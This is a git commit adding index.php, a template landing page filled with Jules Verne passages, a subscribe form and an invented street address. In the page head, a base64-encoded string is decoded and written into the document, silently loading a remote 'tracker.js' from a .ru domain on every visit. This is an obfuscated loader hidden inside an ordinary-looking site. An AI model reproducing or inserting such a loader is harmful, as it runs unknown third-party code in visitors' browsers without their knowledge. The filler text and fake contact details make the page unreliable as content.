b252f3b8dee963491a5b0a1a54200a102fce86d6
fjhhblgn <77049417+fjhhblgn@users.noreply.github.com>
2021-01-06 11:17:58 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Precisely, Ned; so that at 32 feet beneath the surface of the sea you would undergo </title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl9sb2FsNXVzbDJhcXUiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+
+</head>
+
+<body>
+
+	<header>
+		<nav>
+			<li><a href="#">Home</a></li>
+			<li><a href="#">Products</a></li>
+			<li><a href="#">About</a></li>
+			<li><a href="#">Contacts</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>Precisely, Ned; so that at 32 feet beneath the surface of the sea you would undergo </h1>
+	</section>
+
+
+	<section class="our-work">
+		<h3 class="title">Yes, sir, the Avenger! A good name! muttered Captai</h3>
+		<p>Picture to yourselves, said I, what this crater must have been when filled with boiling lava, and when the level of the incandescent liquid rose to the orifice of the mountain, as though melted on the top of a hot plate. As you say, Ned. And think what destruction such a mass would cause if hurled with the speed of an express train against the hull of a vessel. That is just like you, friend Conseil, said Ned impatiently. You are never out of temper, always calm; you would return thanks before grace, and die of hunger rather than complain! We had no time to lose, however. We were lying upon the back of a sort of submarine boat, which appeared (as far as I could judge) like a huge fish of steel. Ned Land's mind was made up on this point. Conseil and I could only agree with him.</p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work">
+		<h3 class="title">Good! And from what country?</h3>
+		<p>During low water the natives roamed about near the Nautilus, but were not troublesome; I heard them frequently repeat the word Assai, and by their gestures I understood that they invited me to go on land, an invitation that I declined. How long will the air in the reservoirs last for us to breathe on board? You have never fished in these seas, Ned? My blood froze in my veins as I recognized two formidable sharks which threatened us. It was a couple of tintoreas, terrible creatures, with enormous tails and a dull glassy stare, the phosphorescent matter ejected from holes pierced around the muzzle. Monstrous brutes, which would crush a whole man in their iron jaws! I did not know whether Conseil stopped to classify them; for my part, I noticed their silver bellies, and their huge mouths bristling with teeth, from a very unscientific point of view, and more as a possible victim than as a naturalist.</p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="title">In the very heart of an extinct volcano, the interior of which </h3>	
+		<p>You see, my friend, it has to do with the monster-the famous narwhal. We are going to purge it from the seas. The author of a work in quarto, in two volumes, on the 'Mysteries of the Great Submarine Grounds' cannot forbear embarking with Commander Farragut. A glorious mission, but a dangerous one! We cannot tell where we may go; these animals can be very capricious. But we will go whether or no; we have got a captain who is pretty wide awake. As Captain Nemo pronounced these words, I turned to Conseil and Ned Land. But my two friends had already incased their heads in the metal cap, and they could neither hear nor answer. I admit, captain, that I am not yet very familiar with that kind of fish. Let us first see where the island of Crespo is.</p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="Email">
+			<input type="Name" placeholder="Name">
+			<input type="Surmane" placeholder="Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer>
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>41480 Elroy Expressway, Apt. 686, 52635-5285, Martineborough, South Carolina, United States</p>
+	</footer>
+
+</body>
+
+</html>
